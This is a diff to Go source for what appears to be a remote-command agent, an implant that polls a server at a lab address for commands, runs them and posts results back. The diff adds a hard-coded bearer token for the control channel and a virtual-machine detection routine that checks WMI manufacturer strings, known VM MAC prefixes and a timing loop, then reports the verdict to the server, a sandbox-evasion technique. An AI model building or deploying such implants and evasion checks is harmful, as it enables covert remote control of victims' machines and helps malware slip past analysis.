@@ -21,12 +21,14 @@ import (
     "sync"
     "syscall"
     "time"
+    "github.com/StackExchange/wmi"
 )
 
 var (
     mu               sync.Mutex
     isCommandRunning bool
     serverURL        = "http://192.168.56.101:5000"
+    bearerToken      = "Azerty112345678"
 )
 
 type Command struct {
@@ -42,6 +44,37 @@ type CommandResult struct {
 
 func main() {
     log.Println("Agent started. Waiting for commands...")
+    log.Println("Agent started. Checking VM status...")
+
+
+        // Perform VM detection
+        vmRes := DetectVM()
+
+
+// Build detailed VM detection result
+        vmResult := fmt.Sprintf(
+                "VM Detection Results:\n"+
+                "- Hypervisor Bit Set: %v\n"+
+                "- BIOS Vendor Indicates VM: %v\n"+
+                "- MAC Address Indicates VM: %v\n"+
+                "- Timing Anomaly Detected: %v\n"+
+                "- Registry Artifacts Found: %v\n"+
+                "--------------------------------\n"+
+                "Likely Running in VM: %v\n",
+                vmRes.HypervisorBit,
+                vmRes.BIOSVendorMatch,
+                vmRes.MACOUI,
+                vmRes.TimingAnomaly,
+                vmRes.RegistryArtifacts,
+                vmRes.LikelyVM,
+        )
+
+        sendResult(CommandResult{
+                ID:     "vm_check",
+                Result: vmResult,
+        })
+
+
     ticker := time.NewTicker(10 * time.Second)
 
     go func() {
@@ -72,18 +105,41 @@ func main() {
 
 func fetchCommand() (Command, error) {
     var cmd Command
-    resp, err := http.Get(fmt.Sprintf("%s/command", serverURL))
+
+    req, err := http.NewRequest("GET", fmt.Sprintf("%s/command", serverURL), nil)
+    if err != nil {
+        return cmd, err
+    }
+
+    // Add hard-coded Bearer token for authentication
+    req.Header.Set("Authorization", "Bearer "+bearerToken)
+
+    client := &http.Client{Timeout: 15 * time.Second}
+    resp, err := client.Do(req)
     if err != nil {
         return cmd, err
     }
     defer resp.Body.Close()
+
+    if resp.StatusCode == http.StatusUnauthorized {
+        log.Println("[-] Unauthorized: invalid or missing token")
+        return cmd, nil
+    }
+
+    if resp.StatusCode != http.StatusOK {
+        // No command available (404 or similar)
+        return cmd, nil
+    }
+
     body, err := ioutil.ReadAll(resp.Body)
     if err != nil {
         return cmd, err
     }
+
     if err := json.Unmarshal(body, &cmd); err != nil {
         return cmd, err
     }
+
     return cmd, nil
 }
 
@@ -94,11 +150,35 @@ func sendResult(result CommandResult) {
         return
     }
 
-    _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
+    req, err := http.NewRequest("POST", fmt.Sprintf("%s/submit_result", serverURL), bytes.NewBuffer(jsonData))
+    if err != nil {
+        log.Printf("Failed to create HTTP request: %v", err)
+        return
+    }
+
+    // Add hard-coded Bearer token for authentication
+    req.Header.Set("Authorization", "Bearer "+bearerToken)
+    req.Header.Set("Content-Type", "application/json")
+
+    client := &http.Client{Timeout: 15 * time.Second}
+    resp, err := client.Do(req)
     if err != nil {
         log.Printf("Failed to send result: %v", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode == http.StatusUnauthorized {
+        log.Println("[-] Unauthorized: invalid or missing token when sending result")
+        return
+    }
+
+    if resp.StatusCode != http.StatusOK {
+        body, _ := ioutil.ReadAll(resp.Body)
+        log.Printf("Server returned status %s: %s", resp.Status, string(body))
     }
 }
+
 
 func executeCommandAndSendResult(cmd Command) {
     switch {
@@ -480,4 +560,99 @@ func executeOtherCommand(cmd Command) {
         resultText += "\nError: " + err.Error()
     }
     sendResult(CommandResult{ID: cmd.ID, Result: resultText})
+}
+// --- VM Detection Logic (Windows only) ---
+
+
+type VMCheckResult struct {
+        HypervisorBit bool `json:"hypervisor_bit"`
+        BIOSVendorMatch bool `json:"bios_vendor_match"`
+        MACOUI bool `json:"mac_oui"`
+        TimingAnomaly bool `json:"timing_anomaly"`
+        RegistryArtifacts bool `json:"registry_artifacts"`
+        LikelyVM bool `json:"likely_vm"`
+}
+
+
+
+func DetectVM() VMCheckResult {
+        res := VMCheckResult{}
+        res.HypervisorBit = false // not implemented
+        res.BIOSVendorMatch = checkDmiStringsWMI()
+        res.MACOUI = checkMACVendor()
+        res.TimingAnomaly = checkTimingAnomaly()
+        res.RegistryArtifacts = false
+
+
+        count := 0
+        if res.HypervisorBit {
+                count++
+        }
+        if res.BIOSVendorMatch {
+                count++
+        }
+        if res.MACOUI {
+                count++
+        }
+        if res.TimingAnomaly {
+                count++
+        }
+        if res.RegistryArtifacts {
+                count++
+        }
+
+
+        res.LikelyVM = count >= 2
+        return res
+}
+
+func checkDmiStringsWMI() bool {
+        type Win32_ComputerSystem struct {
+                Manufacturer string
+                Model        string
+        }
+
+        var sysInfo []Win32_ComputerSystem
+        err := wmi.Query("SELECT Manufacturer, Model FROM Win32_ComputerSystem", &sysInfo)
+        if err != nil || len(sysInfo) == 0 {
+                return false
+        }
+
+        known := []string{"VMware", "VirtualBox", "Xen", "QEMU", "Microsoft", "KVM"}
+        man := strings.ToLower(sysInfo[0].Manufacturer)
+        model := strings.ToLower(sysInfo[0].Model)
+        for _, k := range known {
+                if strings.Contains(man, strings.ToLower(k)) || strings.Contains(model, strings.ToLower(k)) {
+                        return true
+                }
+        }
+        return false
+}
+
+func checkMACVendor() bool {
+        vmOuis := []string{
+                "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00",
+        }
+        ifaces, err := net.Interfaces()
+        if err != nil {
+                return false
+        }
+        for _, iface := range ifaces {
+                mac := iface.HardwareAddr.String()
+                for _, prefix := range vmOuis {
+                        if strings.HasPrefix(strings.ToUpper(mac), strings.ToUpper(prefix)) {
+                                return true
+                        }
+                }
+        }
+        return false
+}
+
+func checkTimingAnomaly() bool {
+        start := time.Now()
+        for i := 0; i < 1000000; i++ {
+                _ = i * i
+        }
+        duration := time.Since(start)
+        return duration > 80*time.Millisecond
 }
